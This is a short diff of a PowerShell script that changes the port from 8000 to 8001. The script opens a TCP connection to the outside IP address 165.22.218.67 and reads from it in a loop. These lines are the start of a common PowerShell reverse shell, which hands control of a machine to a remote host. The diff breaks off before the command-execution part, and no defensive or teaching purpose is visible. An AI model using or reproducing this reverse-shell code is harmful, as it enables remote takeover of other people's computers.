@@ -1,5 +1,5 @@
 
-$client = New-Object Net.Sockets.TCPClient('165.22.218.67',8000);
+$client = New-Object Net.Sockets.TCPClient('165.22.218.67',8001);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
